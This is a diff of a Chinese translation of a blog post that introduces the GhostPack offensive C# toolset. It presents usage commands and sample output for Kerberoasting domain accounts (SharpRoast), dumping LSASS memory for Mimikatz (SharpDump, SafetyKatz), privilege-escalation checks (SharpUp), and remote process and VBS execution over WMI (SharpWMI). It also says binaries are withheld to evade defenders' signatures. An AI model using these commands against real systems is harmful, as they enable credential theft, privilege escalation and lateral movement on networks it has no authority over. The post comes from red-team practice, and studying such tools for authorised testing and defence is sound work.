@@ -2,46 +2,46 @@
 
 ## **GhostPack**
 
-Ghostpack \(目前\)是以前 PowerShell 功能的各种 C\# 实现的集合，包括今天发布的六个独立的工具集—— [Seatbelt](https://github.com/GhostPack/Seatbelt/), [SharpUp](https://github.com/GhostPack/SharpUp/), [SharpRoast](https://github.com/GhostPack/SharpRoast/), [SharpDump](https://github.com/GhostPack/SharpDump/), [SafetyKatz](https://github.com/GhostPack/SafetyKatz/), 和 [SharpWMI](https://github.com/GhostPack/SharpWMI/)。 所有这些项目都将托管在 [GhostPack](http://github.com/GhostPack/) 的 GitHub 代码仓库中，每个项目作为一个独立的存储库分离出来。
+Ghostpack (目前)是以前 PowerShell 功能的各种 C# 实现的集合，包括今天发布的六个独立的工具集—— [Seatbelt](https://github.com/GhostPack/Seatbelt/), [SharpUp](https://github.com/GhostPack/SharpUp/), [SharpRoast](https://github.com/GhostPack/SharpRoast/), [SharpDump](https://github.com/GhostPack/SharpDump/), [SafetyKatz](https://github.com/GhostPack/SafetyKatz/), 和 [SharpWMI](https://github.com/GhostPack/SharpWMI/)。 所有这些项目都将托管在 [GhostPack](http://github.com/GhostPack/) 的 GitHub 代码仓库中，每个项目作为一个独立的存储库分离出来。
 
-附带说明: GhostPack 并不打算只用 C\# 代码，也不是纯粹的进攻性工具包，尽管今天发布的项目都是 C\# 代码。我们的计划是让组织容纳许多与安全相关的项目，并且希望这些项目不是 PowerShell 相关的。 此外，为了防止防御者构建签名检测该工具包\(请考虑标记各个作者的 Twitter 用户名:\) ，我们目前不打算为任何项目发布二进制文件。 然而，所有的东西都是与 Visual Studio Community 2015 兼容的，所以你很容易就可以自己构建。
+附带说明: GhostPack 并不打算只用 C# 代码，也不是纯粹的进攻性工具包，尽管今天发布的项目都是 C# 代码。我们的计划是让组织容纳许多与安全相关的项目，并且希望这些项目不是 PowerShell 相关的。 此外，为了防止防御者构建签名检测该工具包(请考虑标记各个作者的 Twitter 用户名:) ，我们目前不打算为任何项目发布二进制文件。 然而，所有的东西都是与 Visual Studio Community 2015 兼容的，所以你很容易就可以自己构建。
 
-充分披露: 这几乎不是什么"新"的东西，只是许多人多年来一直使用的相同技术的不同实现。 此外，这里的所有代码都应该被认为是 beta 版——它已经进行了一些测试，但仍然存在大量的 bug\)
+充分披露: 这几乎不是什么"新"的东西，只是许多人多年来一直使用的相同技术的不同实现。 此外，这里的所有代码都应该被认为是 beta 版——它已经进行了一些测试，但仍然存在大量的 bug)
 
 ## **安全带（Seatbelt）**
 
-[Seatbelt](https://github.com/GhostPack/Seatbelt/) 是迄今为止发布的最丰富的一个项目。 这是一个态势感知安全检查的交换所。 也就是说，它管理主机数据的收集，这些数据从进攻和防守的角度来看都可能是有趣的。 从 PowerShell 安全设置，到当前用户的 Kerberos 票证，到删除的回收站项目，以及更多\(当前检查项有40+!\)
+[Seatbelt](https://github.com/GhostPack/Seatbelt/) 是迄今为止发布的最丰富的一个项目。 这是一个态势感知安全检查的交换所。 也就是说，它管理主机数据的收集，这些数据从进攻和防守的角度来看都可能是有趣的。 从 PowerShell 安全设置，到当前用户的 Kerberos 票证，到删除的回收站项目，以及更多(当前检查项有40+!)
 
-安全带在它的[README.md](https://github.com/GhostPack/Seatbelt/blob/master/README.md)文件中描述了大量已经实现的功能，并且已经证明它在我们的渗透活动中非常有用。 它深受[@tifkin\_](https://twitter.com/tifkin_)的 [Get-HostProfile.ps1](https://github.com/leechristensen/Random/blob/master/PowerShellScripts/Get-HostProfile.ps1)  以及[@andrewchiles](https://twitter.com/andrewchiles) 的[HostEnum.ps1](https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1)  PowerShell 脚本的影响。
+安全带在它的[README.md](https://github.com/GhostPack/Seatbelt/blob/master/README.md)文件中描述了大量已经实现的功能，并且已经证明它在我们的渗透活动中非常有用。 它深受[@tifkin\_](https://twitter.com/tifkin\_)的 [Get-HostProfile.ps1](https://github.com/leechristensen/Random/blob/master/PowerShellScripts/Get-HostProfile.ps1)  以及[@andrewchiles](https://twitter.com/andrewchiles) 的[HostEnum.ps1](https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1)  PowerShell 脚本的影响。
 
 SeatBelt.exe会收集以下系统数据:
 
-*  ****BasicOSInfo ——基本操作系统信息\(即架构、操作系统版本等\)
-* RebootSchedule ——基于事件 id 12和13的系统重新启动计划任务\(最后15天\)
-* TokenGroupPrivs——当前进程或令牌的特权\(例如 SeDebugPrivilege 等\)
+* &#x20;**** BasicOSInfo ——基本操作系统信息(即架构、操作系统版本等)
+* RebootSchedule ——基于事件 id 12和13的系统重新启动计划任务(最后15天)
+* TokenGroupPrivs——当前进程或令牌的特权(例如 SeDebugPrivilege 等)
 * UACSystemPolicies ——UAC 系统策略——通过注册表设置的 UAC 系统策略
 * PowerShellSettings —— PowerShell 版本和通过注册表进行的安全设置
 * AuditSettings — ——通过注册表进行的审计设置
-* WEFSettings ——通过注册表进行 Windows 事件转发\(Windows Event Forwarding\)的设置
-* LSASettings ——LSA 设置\(包括认证包\)
+* WEFSettings ——通过注册表进行 Windows 事件转发(Windows Event Forwarding)的设置
+* LSASettings ——LSA 设置(包括认证包)
 * UserEnvVariables ——当前用户环境变量
 * SystemEnvVariables ——当前系统环境变量
 * UserFolders —— C:\Users\下的文件夹
 * NonstandardServices——非标准服务——二进制文件路径不在 C:\Windows\  中的服务
 * InternetSettings ——IE设置，包括代理服务器配置
-* LapsSettings ——LAPS 设置\(如果已安装\)
+* LapsSettings ——LAPS 设置(如果已安装)
 * LocalGroupMembers ——本地管理员、 RDP 和远程 DCOM 组的成员
 * MappedDrives ——当前映射的驱动器
 * RDPSessions ——当前传入的 RDP 会话
 * WMIMappedDrives ——通过 WMI 映射的驱动器
 * NetworkShares ——网络共享
 * FirewallRules ——防火墙拒绝规则，完整导出所有规则
-* AntiVirusWMI ——已注册的反病毒软件\(通过 WMI\)
+* AntiVirusWMI ——已注册的反病毒软件(通过 WMI)
 * InterestingProcesses ——"趣味"进程ー防御性产品和管理工具
 * RegistryAutoLogon——注册表中的自动登录信息
 * RegistryAutoRuns ——注册表中的自动运行信息
-* DNSCache —— DNS 缓存条目\(通过 WMI\)
-* ARPTable ——列出当前的 ARP 表和适配器信息\(等价于 ARP-a\)
+* DNSCache —— DNS 缓存条目(通过 WMI)
+* ARPTable ——列出当前的 ARP 表和适配器信息(等价于 ARP-a)
 * AllTcpConnections ——列出当前的 TCP 连接和相关进程
 * AllUdpConnections ——列出当前 UDP 连接和相关进程
 * NonstandardProcesses——进程的二进制路径不在 C:\Windows\中的进程
@@ -66,13 +66,13 @@ SeatBelt.exe user 命令会收集以下用户数据:
 其他杂项:
 
 * CurrentDomainGroups —当前用户的本地用户组和域用户组
-* Patches — 通过 WMI 安装的补丁\(在某些系统上需要\)
+* Patches — 通过 WMI 安装的补丁(在某些系统上需要)
 * LogonSessions —用户登录会话数据
 * KerberosTGTData ——列出所有的 TGT 票证
 * InterestingFiles ——与用户文件夹中的各种模式相匹配的文件
 * IETabs ——打开 Internet Explorer 浏览器标签页
 * TriageChrome—— Chrome 浏览器书签和历史
-* TriageFirefox ——Firefox 历史记录\(无书签\)
+* TriageFirefox ——Firefox 历史记录(无书签)
 * RecycleBin ——过去30天内删除的回收站中的文件（只能在用户上下文中使用）
 * KerberosTickets ——列出 Kerberos 票证，如果是特权升级的，则会列出所有按所有登录会话分组的票证
 * 4624Events ——来自安全事件日志的4624登录事件
@@ -80,25 +80,25 @@ SeatBelt.exe user 命令会收集以下用户数据:
 
 SeatBelt.exe all 会运行完整的枚举检查，可以与 full 参数组合使用。
 
-SeatBelt.exe \[CheckName\] \[CheckName2\] … 将只运行一个或多个指定的检查\(名称区分大小写!\)
+SeatBelt.exe \[CheckName] \[CheckName2] … 将只运行一个或多个指定的检查(名称区分大小写!)
 
-SeatBelt.exe \[system/user/all/CheckName\] full 将阻止任何过滤，并返回完整的结果。 默认情况下，某些检查会被过滤\(例如，不在 c:\Windows 的服务等等\)
+SeatBelt.exe \[system/user/all/CheckName] full 将阻止任何过滤，并返回完整的结果。 默认情况下，某些检查会被过滤(例如，不在 c:\Windows 的服务等等)
 
 下面是一些系统集合的例子:
 
-![&#x4F60;&#x503C;&#x5F97;&#x62E5;&#x6709;&#x7684; PowerShell &#x5185;&#x7F51;&#x6E17;&#x900F;&#x5DE5;&#x5177;&#x5305;&#x2014;&#x2014;GhostPack](https://img.4hou.com/uploads/20190810/1565408023631362.png)
+![你值得拥有的 PowerShell 内网渗透工具包——GhostPack](https://img.4hou.com/uploads/20190810/1565408023631362.png)
 
 有很多的检查项和有趣的信息收集操作——我非常建议你运行这些参数，看看什么是适合你的！
 
 ## **SharpUp**
 
-[SharpUp](https://github.com/GhostPack/SharpUp/) 是 [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) 利用 C\# 实现权限提升检查的开始。 目前，只进行了最常见的检查，尚未实施武器化功能。 目前实现的检查如下:
+[SharpUp](https://github.com/GhostPack/SharpUp/) 是 [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) 利用 C# 实现权限提升检查的开始。 目前，只进行了最常见的检查，尚未实施武器化功能。 目前实现的检查如下:
 
 * GetModifiableServices ——返回当前用户可以修改的服务
 * GetModifiableServiceBinaries ——返回当前用户可以修改的二进制文件的服务
 * GetAlwaysInstallElevated ——返回 AlwaysInstallElevated 注册表项的值
 * GetPathHijacks ——返回当前用户可以修改的%PATH% 中的任何文件夹
-* GetModifiableRegistryAutoRuns ——返回设置为在 HKLM 自动运行配置中运行的任何可修改的二进制文件或脚本**·** GetSpecialTokenGroupPrivs ——返回”特殊"用户权限\(如 SeDebugPrivilege等等\)
+* GetModifiableRegistryAutoRuns ——返回设置为在 HKLM 自动运行配置中运行的任何可修改的二进制文件或脚本**·** GetSpecialTokenGroupPrivs ——返回”特殊"用户权限(如 SeDebugPrivilege等等)
 * GetUnattendedInstallFiles ——返回任何剩余的无人参与的安装文件
 * GetMcAfeeSitelistFiles ——返回 McAfee SiteList.xml 文件路径
 
@@ -159,9 +159,9 @@ Modifable %PATH% Folder
 
 ## **SharpRoast**
 
-[SharpRoast](https://github.com/GhostPack/SharpRoast/) 是 [PowerView 各种 Kerberoasting 功能的 C\# 版本](https://github.com/PowerShellMafia/PowerSploit/blob/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1#L2574-L2774)。 [KerberosRequestorSecurityToken.GetRequest Method\(\)](https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest%2528v=vs.110%2529.aspx) 方法由[@machosec](https://twitter.com/machosec) 提供给 PowerView。哈希以 [hashcat](https://hashcat.net/hashcat/)  格式输出。
+[SharpRoast](https://github.com/GhostPack/SharpRoast/) 是 [PowerView 各种 Kerberoasting 功能的 C# 版本](https://github.com/PowerShellMafia/PowerSploit/blob/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1#L2574-L2774)。 [KerberosRequestorSecurityToken.GetRequest Method()](https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest%28v=vs.110%29.aspx) 方法由[@machosec](https://twitter.com/machosec) 提供给 PowerView。哈希以 [hashcat](https://hashcat.net/hashcat/)  格式输出。
 
-更多关于 Kerberoasting 的信息，包括 Tim Medin 关于这个主题的原始演讲的链接，请查看我2016年11月发表的博文——[“没有 Mimikatz 的 Kerberoasting"](http://kerberoasting%20without%20mimikatz/)。
+更多关于 Kerberoasting 的信息，包括 Tim Medin 关于这个主题的原始演讲的链接，请查看我2016年11月发表的博文——[“没有 Mimikatz 的 Kerberoasting"](http://kerberoasting/%20without%20mimikatz/)。
 
 对当前域的所有用户进行Kerberoasting攻击:
 
@@ -207,14 +207,14 @@ ServicePrincipalName   : service/host
 Hash                   : $krb5tgs$23$*$testlab.local$service/host*$08A6462...
 ```
 
-在另一个\(受信任的\)的域的特定 SPN发起Kerberoasting攻击:
+在另一个(受信任的)的域的特定 SPN发起Kerberoasting攻击:
 
 ```bash
 C:\Temp\>SharpRoast.exe "MSSQLSvc/SQL@dev.testlab.local"
 Hash                   : $krb5tgs$23$*user$DOMAIN$MSSQLSvc/SQL@dev.testlab.local*$9994D148...
 ```
 
-对另一个\(受信任的\)域中的所有用户执行Kerberoasting攻击:
+对另一个(受信任的)域中的所有用户执行Kerberoasting攻击:
 
 ```bash
 C:\Temp>SharpRoast.exe "LDAP://DC=dev,DC=testlab,DC=local"
@@ -226,7 +226,7 @@ Hash                   : $krb5tgs$23$*$dev.testlab.local$test/test*$9129566
 ...
 ```
 
-这些命令中的任何一个都可以接受一个\[domain.com\user\]\[password\] ，以便使用显式凭证进行 Kerberoasting攻击。例如:
+这些命令中的任何一个都可以接受一个\[domain.com\user]\[password] ，以便使用显式凭证进行 Kerberoasting攻击。例如:
 
 ```bash
 [domain.com\user][password] ，以便使用显式凭证进行 Kerberoasting攻击。例如:
@@ -241,11 +241,11 @@ Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$14AA4F...
 
 ## **SharpDump**
 
-[SharpDump](https://github.com/GhostPack/SharpDump/) 本质上是各种 [PowerSploit 的 Out-Minidump.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1)  的 C\# 版本。[MiniDumpWriteDump](https://docs.microsoft.com/en-us/windows/desktop/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump) Win32 API 调用用于为指定的进程 ID \(默认情况下为 LSASS\)创建一个转储到 to C:\Windows\Temp\debug&lt;PID&gt;.out 文件。GZipStream 用于将转储压缩为 C:\Windows\Temp\debug&lt;PID&gt;.bin\(.gz 格式\) ，并删除原始的 minidump 文件。
+[SharpDump](https://github.com/GhostPack/SharpDump/) 本质上是各种 [PowerSploit 的 Out-Minidump.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1)  的 C# 版本。[MiniDumpWriteDump](https://docs.microsoft.com/en-us/windows/desktop/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump) Win32 API 调用用于为指定的进程 ID (默认情况下为 LSASS)创建一个转储到 to C:\Windows\Temp\debug\<PID>.out 文件。GZipStream 用于将转储压缩为 C:\Windows\Temp\debug\<PID>.bin(.gz 格式) ，并删除原始的 minidump 文件。
 
-转储 LSASS \(默认值\)的运行例子:
+转储 LSASS (默认值)的运行例子:
 
-```text
+```
 C:\Temp>SharpDump.exe
 
 [*] Dumping lsass (808) to C:\WINDOWS\Temp\debug808.out
@@ -275,9 +275,9 @@ C:\Temp>SharpDump.exe 8700
 [+] Dumping completed. Rename file to "debug8700.gz" to decompress.
 ```
 
-如果转储 LSASS，则可以在转储后下载这个压缩的 minidump，并重命名为 dump&lt;PID&gt;.gz，之后在一个类似的平台上运行 Mimikatz 的 sekurlsa::minidump命令:
+如果转储 LSASS，则可以在转储后下载这个压缩的 minidump，并重命名为 dump\<PID>.gz，之后在一个类似的平台上运行 Mimikatz 的 sekurlsa::minidump命令:
 
-![&#x4F60;&#x503C;&#x5F97;&#x62E5;&#x6709;&#x7684; PowerShell &#x5185;&#x7F51;&#x6E17;&#x900F;&#x5DE5;&#x5177;&#x5305;&#x2014;&#x2014;GhostPack](https://img.4hou.com/uploads/20190810/1565408112966705.png)
+![你值得拥有的 PowerShell 内网渗透工具包——GhostPack](https://img.4hou.com/uploads/20190810/1565408112966705.png)
 
 ## **SafetyKatz**
 
@@ -322,9 +322,9 @@ mimikatz # deleting C:\Windows\Temp\debug.bin
 
 ## **SharpWMI**
 
-最后一个小工具\([SharpWMI](https://github.com/GhostPack/SharpWMI/)\)是一个各种 WMI 功能的简单 C\# 包装器。 它允许通用的远程\(或本地\) WMI 查询、通过 Win32\_Process 的远程进程执行以及通过"临时"永久 WMI 事件订阅的远程 VBS 执行。
+最后一个小工具([SharpWMI](https://github.com/GhostPack/SharpWMI/))是一个各种 WMI 功能的简单 C# 包装器。 它允许通用的远程(或本地) WMI 查询、通过 Win32\_Process 的远程进程执行以及通过"临时"永久 WMI 事件订阅的远程 VBS 执行。
 
-```text
+```
 Local system enumeration  :
     SharpWMI.exe action=query query="select * from win32_service" [namespace=BLAH]
     Ex: SharpWMI.exe action=query query="select * from win32_process"
@@ -346,7 +346,7 @@ Remote VBS execution      :
 
 这个工具里面没有什么革命性的东西，但 WMI 事件订阅方法可以很好地服务于我们。 基于计时器的事件订阅是在远程系统上创建的，因此任意的 VBS 脚本都可以作为 ActiveScriptEventConsumer 的有效载荷。 事件触发器被触发后，你的 VBS 会被执行，之后一切都会被清理干净:
 
-```text
+```
 C:\Temp>SharpWMI.exe action=executevbs computername=primary.testlab.local
 
 [*] Creating 'Timer' object on primary.testlab.local
@@ -363,4 +363,3 @@ C:\Temp>SharpWMI.exe action=executevbs computername=primary.testlab.local
 ```
 
 可以使用eventname=BLAH参数修改过滤器或使用者名称。 如果要更改执行的 VBS 脚本，请在编译之前修改项目顶部的 vbsPayload 字符串。 推荐使用 [DotNetToJScript](https://github.com/tyranid/DotNetToJScript)。
-
